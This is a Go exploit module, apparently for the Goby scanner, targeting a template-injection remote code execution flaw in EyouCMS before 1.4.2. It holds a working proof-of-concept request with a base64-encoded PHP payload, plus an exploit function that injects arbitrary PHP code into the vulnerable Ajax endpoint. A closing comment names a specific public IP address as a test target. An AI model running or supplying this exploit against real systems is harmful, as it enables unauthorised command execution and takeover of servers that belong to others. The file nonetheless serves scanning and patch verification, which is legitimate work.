package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EyouCMS less than 1.4.2 SSTI",
    "Description": "The execution of eyoucms arbitrary command can cause the attacker to obtain the server permission and control the server",
    "Product": "EyouCMS < 1.4.2",
    "Homepage": "https://www.eyoucms.com/",
    "DisclosureDate": "2021-06-06",
    "Author": "hututued",
    "GobyQuery": "app=\"eyoucms\"",
    "Level": "3",
    "Impact": "<p>Arbitrary command execution can cause the attacker to obtain the server permission and control the whole server</p>",
    "Recommendation": "<p>Upgrade to the latest official version</p>",
    "References": [
        "http://www.lovei.org/archives/EyouCMS-SSTI.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpCode",
            "type": "input",
            "value": "echo md5(123);"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10212"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		// PoC 函数
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/index.php?m=api&c=Ajax&a=get_tag_memberlist"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("Accept", "*/*")
			cfg.Header.Store("Accept-Language", "en")
			cfg.Header.Store("Connection", "close")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "htmlcode=zhang&attarray=eyJ9Ijoie3BocH1lY2hvICd5b3UgZ2V0IHNoZWxsJzt7XC9waHB9In0="
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "you get shell")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/index.php?m=api&c=Ajax&a=get_tag_memberlist"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Accept-Encoding", "gzip, deflate")
			cfg.Header.Store("X-Requested-With", "XMLHttpRequest")
			cfg.Header.Store("Accept", "*/*")
			cfg.Header.Store("Accept-Language", "en")
			cfg.Header.Store("Connection", "close")
			cfg.Header.Store("User-Agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)")
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			phpCode := ss.Params["phpCode"].(string)
			phpCode = "{\"}\":\"{php}" + phpCode + ";{\\/php}\"}"
			encoded := base64.StdEncoding.EncodeToString([]byte(phpCode))
			cfg.Data = fmt.Sprintf("htmlcode=zhang&attarray=%s", encoded)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					m := regexp.MustCompile("script>='(.*)' ").FindStringSubmatch(resp.RawBody)
					if m != nil {
						expResult.Output = m[1]
						expResult.Success = true
					}

				}
			}
			return expResult

		},
	))
}

//测试ip端口 https://115.28.139.174:443    因为使用的https协议所以需要加上https://
